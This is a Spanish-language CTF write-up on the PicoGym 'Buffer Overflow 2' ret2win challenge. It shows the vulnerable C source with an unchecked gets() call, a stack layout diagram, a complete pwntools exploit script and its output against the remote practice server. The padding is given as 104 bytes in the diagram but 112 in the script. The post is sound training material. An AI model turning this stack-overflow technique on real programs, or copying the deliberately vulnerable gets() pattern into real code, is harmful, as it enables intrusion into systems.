---
layout: post
title: Buffer Overflow 2 PicoGym
comments: true
categories: [Pwn, Writeups, PicoCTF]
---

En este post estaremos resolviendo un reto del [PicoGym](https://play.picoctf.org/practice/challenge/490?category=6&page=1&retired=0). Se trata de un reto tipo *ret2win* con parámetros muy sencillo

<br>
![Image]({{ site.baseurl }}/images/posts/picoGym/pico_logo.png){:width="200px"}

# Reconocimiento

   > Control the return address and arguments

Como nos muestra el enunciado, nuestro objetivo será llamar a `win` sobreescribiendo el `$eip`. Sólo tenemos que tener en cuenta que hay que pasar dos parámetros correctamente.

```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Explotación

Para lograr saltar a la función, tendremos que sobreescribir el `$eip`, seguido de una dirección de retorno (puede ser cualquier cosa, yo he puesto la dirección de `main` como buena práctica) y de los parámetros:

```
[ padding (104 bytes)          ]
[ dirección de win()           ] ← EIP salta aquí
[ dirección de retorno fake    ] ← no importa mucho
[ argumento 1 = 0xCAFEF00D     ]
[ argumento 2 = 0xF00DF00D     ]
```

Con un script en python se haría de la siguiente forma:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("saturn.picoctf.net", 58837)
    elif args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *vuln+29
'''.format(**locals())

io = start()

io.recvuntil(b'string:')

offset = 112
win = exe.symbols['win']  # dirección de win()
main = exe.symbols['main']  # dirección de win()

payload  = b"A" * offset
payload += p32(win)             # EIP → win()
payload += p32(main)      # fake return address (puede ser cualquier cosa)
payload += p32(0xCAFEF00D)      # arg1
payload += p32(0xF00DF00D)      # arg2

io.sendline(payload)

io.interactive()
```

Y al ejecutar en remoto nos devolverá la flag:

```bash
python3 solver.py REMOTE
[*] '/home/kali/Downloads/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to saturn.picoctf.net on port 58837: Done
[*] Switching to interactive mode
 
\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08r\x93\x04\x08
picoCTF{<REDACTED>}Please enter your string: 
```

<br>